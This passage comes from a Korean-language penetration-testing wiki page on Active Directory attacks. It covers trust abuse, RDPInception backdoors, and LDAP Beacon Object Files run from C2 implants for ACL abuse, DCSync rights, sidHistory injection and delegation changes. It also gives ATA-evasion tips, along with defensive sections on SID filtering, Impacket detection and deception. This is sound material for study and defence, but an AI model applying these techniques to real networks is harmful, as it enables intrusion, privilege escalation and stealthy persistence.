이 시나리오에서 **여러분의 도메인**은 **다른 도메인**의 principal에 일부 **권한**을 **신뢰**하고 있습니다.

하지만 신뢰하는 도메인이 신뢰받는 도메인을 **신뢰**하면, 신뢰받는 도메인은 **예측 가능한 이름**을 가진 사용자를 **생성**하고, 이 사용자의 **비밀번호로 신뢰 비밀번호**를 사용합니다. 즉, 신뢰하는 도메인의 사용자로 **접근해 신뢰받는 도메인에 들어가서** 해당 도메인을 열거하고 추가 권한 상승을 시도할 수 있습니다:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

신뢰받는 도메인을 침해하는 또 다른 방법은 도메인 트러스트와 **반대 방향**으로 생성된 [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links)를 찾는 것입니다(이는 흔하지 않습니다).

신뢰받는 도메인을 침해하는 또 다른 방법은 **신뢰받는 도메인의 사용자가 접근할 수 있는** 머신에서 대기하다가 **RDP**로 로그인하는 것입니다. 그러면 공격자는 RDP 세션 프로세스에 코드를 주입하고, 그곳에서 **피해자의 원본 도메인에 접근**할 수 있습니다.\
또한 **피해자가 하드 드라이브를 마운트했다면**, 공격자는 **RDP 세션** 프로세스에서 **하드 드라이브의 시작 폴더**에 **백도어**를 저장할 수 있습니다. 이 기술은 **RDPInception**이라고 합니다.


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### 도메인 트러스트 악용 완화

### **SID Filtering:**

- 포리스트 트러스트를 통한 SID history 속성 악용 공격의 위험은 SID Filtering으로 완화됩니다. SID Filtering은 모든 포리스트 간 트러스트에서 기본적으로 활성화되어 있습니다. 이는 Microsoft의 방침에 따라 도메인이 아닌 포리스트를 보안 경계로 간주하고, 포리스트 내 트러스트는 안전하다고 가정하는 데 기반합니다.
- 하지만 주의할 점이 있습니다. SID filtering은 애플리케이션과 사용자 액세스를 방해할 수 있어, 때때로 비활성화되기도 합니다.

### **Selective Authentication:**

- 포리스트 간 트러스트에는 Selective Authentication을 사용해 두 포리스트의 사용자가 자동으로 인증되지 않도록 할 수 있습니다. 대신, 사용자가 신뢰하는 도메인이나 포리스트 내의 도메인 및 서버에 접근하려면 명시적인 권한이 필요합니다.
- 이러한 조치는 쓰기 가능한 Configuration Naming Context (NC) 악용이나 트러스트 계정 공격을 방지하지 못한다는 점에 유의해야 합니다.

[**ired.team에서 도메인 트러스트에 관한 자세한 정보를 확인하세요.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## 온호스트 임플란트를 통한 LDAP 기반 AD 악용

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection)은 bloodyAD 스타일의 LDAP 프리미티브를 온호스트 임플란트(예: Adaptix C2) 내에서 전부 실행되는 x64 Beacon Object Files로 재구현합니다. 오퍼레이터는 `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`로 팩을 컴파일하고, `ldap.axs`를 로드한 다음 비컨에서 `ldap <subcommand>`를 호출합니다. 모든 트래픽은 현재 로그온 보안 컨텍스트를 사용해 서명/봉인된 LDAP (389) 또는 자동 인증서 신뢰가 적용되는 LDAPS (636)를 통해 전달되므로 socks 프록시나 디스크 아티팩트가 필요하지 않습니다.<sup>[[4]](#references)</sup>

### 임플란트 측 LDAP 열거

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, `get-groupmembers`는 짧은 이름/OU 경로를 전체 DN으로 변환하고 해당 객체를 덤프합니다.
- `get-object`, `get-attribute`, `get-domaininfo`는 임의의 속성(보안 설명자 포함)과 `rootDSE`의 포리스트/도메인 메타데이터를 가져옵니다.
- `get-uac`, `get-spn`, `get-delegation`, `get-rbcd`는 roasting 대상, delegation 설정, LDAP에서 직접 가져온 기존 [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) 설명자를 노출합니다.
- `get-acl`과 `get-writable --detailed`는 DACL을 파싱해 trustee, 권한(GenericAll/WriteDACL/WriteOwner/속성 쓰기), 상속을 나열하여 ACL 권한 상승의 즉각적인 표적을 제시합니다.

```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```

### 에스컬레이션 및 지속성을 위한 LDAP 쓰기 프리미티브

- 객체 생성 BOF(`add-user`, `add-computer`, `add-group`, `add-ou`)를 사용하면 OU 권한이 있는 위치에 새 principal 또는 컴퓨터 계정을 미리 준비할 수 있습니다. 쓰기 속성 권한을 찾으면 `add-groupmember`, `set-password`, `add-attribute`, `set-attribute`로 대상을 직접 탈취할 수 있습니다.
- ACL 중심 명령어인 `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, `add-dcsync`는 AD 객체에 대한 WriteDACL/WriteOwner 권한을 암호 재설정, 그룹 구성원 제어 또는 DCSync 복제 권한으로 바꿉니다. PowerShell/ADSI 흔적을 남기지 않습니다. `remove-*` 대응 명령어를 사용하면 추가한 ACE를 정리할 수 있습니다.

### 위임, roasting, Kerberos 악용

- `add-spn`/`set-spn`을 사용하면 침해한 사용자를 즉시 Kerberoast 대상으로 만들 수 있습니다. `add-asreproastable`(UAC 토글)은 암호를 건드리지 않고 해당 계정을 AS-REP roasting 대상으로 표시합니다.
- 위임 매크로(`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`)는 beacon에서 `msDS-AllowedToDelegateTo`, UAC 플래그 또는 `msDS-AllowedToActOnBehalfOfOtherIdentity`를 수정합니다. 이를 통해 constrained/unconstrained/RBCD 공격 경로를 열고 원격 PowerShell이나 RSAT의 필요성을 없앱니다.

### sidHistory 주입, OU 이동 및 공격 표면 조정

- `add-sidhistory`는 제어하는 principal의 SID history에 특권 SID를 주입합니다([SID-History Injection](sid-history-injection.md) 참고). 이를 통해 LDAP/LDAPS만으로 은밀하게 액세스 권한을 상속할 수 있습니다.
- `move-object`는 컴퓨터나 사용자의 DN/OU를 변경합니다. 공격자는 이를 통해 자산을 위임된 권한 범위로 옮긴 다음 `set-password`, `add-groupmember` 또는 `add-spn`을 사용할 수 있습니다. 이동 권한 및 상속 확인은 [OU relocation and inherited rights](acl-persistence-abuse/#moving-an-object-into-inherited-ou-permissions)를 참고하세요.
- 범위가 엄격히 제한된 제거 명령어(`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` 등)를 사용하면 운영자가 자격 증명이나 지속성을 확보한 뒤 빠르게 되돌릴 수 있어 텔레메트리를 최소화할 수 있습니다.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## 몇 가지 일반적인 방어

[**자격 증명 보호 방법에 대한 자세한 내용은 여기에서 확인하세요.**](../stealing-credentials/credentials-protections.md)

### **자격 증명 보호를 위한 방어 조치**

- **Domain Admins 제한**: Domain Admins의 로그인을 Domain Controller로만 허용하고, 다른 호스트에서는 사용하지 않는 것이 좋습니다.
- **서비스 계정 권한**: 보안을 위해 서비스를 Domain Admin(DA) 권한으로 실행하지 않아야 합니다.
- **권한 사용 시간 제한**: DA 권한이 필요한 작업의 경우, 권한 사용 시간을 제한해야 합니다. 다음과 같이 설정할 수 있습니다: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay 완화**: Event ID 2889/3074/3075를 감사한 뒤 DC/클라이언트에서 LDAP signing과 LDAPS channel binding을 적용해 LDAP MITM/relay 시도를 차단합니다.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Impacket 활동의 프로토콜 수준 지문 식별

일반적인 AD tradecraft를 탐지하려는 경우, 이름을 바꾼 바이너리, 서비스 이름, 임시 batch 파일, 출력 경로처럼 **운영자가 제어할 수 있는 흔적에만 의존하지 마세요**. 정상 Windows 클라이언트가 [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC 및 WMI 트래픽을 생성하는 방식을 기준선으로 설정하고, 운영자가 `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` 또는 `ntlmrelayx.py`를 수정한 뒤에도 남는 **구현상의 특이점**을 찾으세요.<sup>[[8]](#references)</sup>

- **높은 신뢰도의 단독 후보**(자체 기준선과 비교 검증한 후 사용):
  - `auth_context_id = 79231 + ctx_id`를 사용하는 인증된 DCE/RPC
  - `0xff`로 채워진 DCE/RPC 인증 패딩
  - raw Kerberos `AP-REQ`를 SPNEGO `mechToken`에 직접 넣는 LDAP Kerberos bind
  - ASCII처럼 보이는 `ClientGuid` 값을 포함한 SMB2/3 negotiate 요청
  - 비표준 네임스페이스 `//./root/cimv2`를 사용하는 WMI `IWbemLevel1Login::NTLMLogin`
  - 하드코딩된 Kerberos nonce 값
- **상관 분석/점수 산정 피처로 더 적합한 항목**:
  - 드물거나 중복된 Kerberos etype 목록, 비정상적이거나 누락된 `PA-DATA`, 또는 native Windows와 다른 TGS-REQ etype 순서
  - 버전 정보가 없는 NTLM Type 1 메시지 또는 호스트 이름이 null인 Type 3 메시지
  - SPNEGO 대신 DCE/RPC에 포함된 raw NTLMSSP, 누락된 DCE/RPC verification trailer, 또는 SPNEGO/Kerberos OID 불일치
  - 동일한 호스트/사용자/세션/시간 범위에서 이런 특성이 여러 개 함께 나타나면, 단일 약한 필드보다 훨씬 강한 신호가 됩니다.
- **단독 경보가 아닌 보강 정보로 사용**:
  - 기본 파일 이름, 출력 경로, 임의 서비스 이름, 임시 batch 이름, 기본 컴퓨터 계정 이름, 도구별 HTTP/WebDAV/RDP/MSSQL 문자열
  - 이런 값은 운영자가 쉽게 변경할 수 있으므로, 프로토콜 간 의심스러운 연관성을 설명하는 데 사용하는 것이 가장 좋습니다.
- **운영 참고 사항**:
  - 일부 신호를 확인하려면 복호화된 트래픽, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW 또는 서비스 측 가시성이 필요합니다.
  - 경보로 전환하기 전에 Samba/Linux 클라이언트, 어플라이언스 및 레거시 소프트웨어를 기준으로 검증하세요.
  - 기준선에 대한 신뢰도를 높여 가면서 탐지를 보강 정보 -> 헌팅 -> 경보 순으로 승격하세요.

### **Deception 기법 구현**

- Deception을 구현하려면 암호가 만료되지 않거나 Trusted for Delegation으로 표시된 decoy 사용자나 컴퓨터 같은 함정을 설정합니다. 구체적인 방법으로는 특정 권한을 가진 사용자를 만들거나 이들을 높은 권한의 그룹에 추가할 수 있습니다.<sup>[[2]](#references)</sup>
- 실제 예시는 다음과 같은 도구를 사용하는 것입니다: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- deception 기법 배포에 대한 자세한 내용은 [GitHub의 Deploy-Deception](https://github.com/samratashok/Deploy-Deception)에서 확인할 수 있습니다.

### **Deception 식별**

- **사용자 객체**: 의심스러운 징후에는 일반적이지 않은 ObjectSID, 드문 로그인, 생성 날짜, 낮은 bad password 횟수가 포함됩니다.
- **일반적인 징후**: 잠재적인 decoy 객체와 실제 객체의 속성을 비교하면 불일치를 찾아낼 수 있습니다. [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) 같은 도구가 이러한 deception을 식별하는 데 도움이 됩니다.

### **탐지 시스템 우회**

- **Microsoft ATA 탐지 우회**:
  - **사용자 열거**: ATA 탐지를 피하려면 Domain Controller에서 세션 열거를 하지 않습니다.
  - **티켓 사칭**: 티켓 생성에 **aes** 키를 사용하면 NTLM으로 다운그레이드하지 않아 탐지를 피할 수 있습니다.
  - **DCSync 공격**: ATA 탐지를 피하려면 Domain Controller가 아닌 곳에서 실행하는 것이 좋습니다. Domain Controller에서 직접 실행하면 경보가 발생합니다.

## References

- [1] [도메인 트러스트 공격 가이드](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Active Directory에서 deception을 위한 트러스트 위조](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Domain Admin에서 Enterprise Admin으로](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP BOF 컬렉션 – Active Directory 익스플로잇을 위한 메모리 내 LDAP 툴킷](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! NTLM 해시를 워드리스트로 무기화하기](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Impacket 분석](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: Netlogon을 통한 Active Directory 계정 탈취](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - CVE-2020-1472와 관련된 Netlogon 보안 채널 연결 변경 사항 관리 방법](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [잊힌 Null Session 및 MS-RPC 인터페이스 탐구](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [도메인 간 보안 경계로서의 SID filter? (4부) - SID filtering 우회 연구](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [도메인 간 보안 경계로서의 SID filter? (5부) - Golden GMSA trust 공격 - 자식 도메인에서 부모 도메인으로](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [도메인 간 보안 경계로서의 SID filter? (6부) - Schema change trust 공격 - 자식 도메인에서 부모 도메인으로](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [ESC5를 이용해 DA에서 EA로](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [AD CS 악용으로 자식 도메인 관리자가 5분 만에 Enterprise Admin으로 승격하는 방법, 후속 글](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [숨겨 둔 ACE: Active Directory DACL 백도어 설계](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [NetExec pre2k 모듈 소스](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema - msDS-GroupMSAMembership 속성](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
